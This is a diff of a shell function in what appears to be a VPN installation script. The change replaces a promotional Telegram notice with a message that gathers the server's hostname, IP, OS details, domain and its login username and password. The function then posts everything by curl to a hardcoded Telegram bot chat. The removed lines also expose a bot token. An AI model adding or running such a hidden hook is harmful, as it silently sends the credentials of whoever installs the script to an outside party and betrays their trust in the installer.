@@ -300,23 +300,25 @@ sts="${Error}"
 fi
 TIMES="10"
 CHATID="5805800034"
-KEY="6495450900:AAHaJpL7xOptW19plOrjmsRTHjjRK_gj2_8"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TIMEZONE=$(printf '%(%H:%M:%S)T')
-    TEXT="
-<code>────────────────────</code>
-<b>⚡AUTOSCRIPT PREMIUM⚡</b>
-<code>────────────────────</code>
-<code>User     :</code><code>$username</code>
-<code>Domain   :</code><code>$domain</code>
-<code>IPVPS    :</code><code>$MYIP</code>
-<code>ISP      :</code><code>$ISP</code>
-<code>Exp Sc.  :</code><code>$exp</code>
-<code>────────────────────</code>
-<b> 🇮🇩🇮🇩 SANZ VPN TUNNELING 🇮🇩🇮🇩</b>
-<code>────────────────────</code>
-<i>Automatic Notifications From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://wa.me/6287716903681"}]]}' 
+TIME="1"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    TEXT="Installasi VPN Script Stable V3.0
+    ============================
+    <code>Tanggal    :</code> <code>$tanggal</code>
+    <code>Hostname   :</code> <code>${HOSTNAME}</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>OS Vps     :</code> <code>$OS_Name</code>
+    <code>Kernel     :</code> <code>$Kernel</code>
+    <code>Arch       :</code> <code>$Arch</code>
+    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
+    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
+    ============================
+    <code>Domain     :</code> <code>$domain</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>User Login :</code> <code>$Username</code>
+    <code>Pass Login :</code> <code>$Password</code>
+    <code>User Script:</code> <code>$username</code>
+    <code>Exp Script :</code> <code>$exp</code>
 
     curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
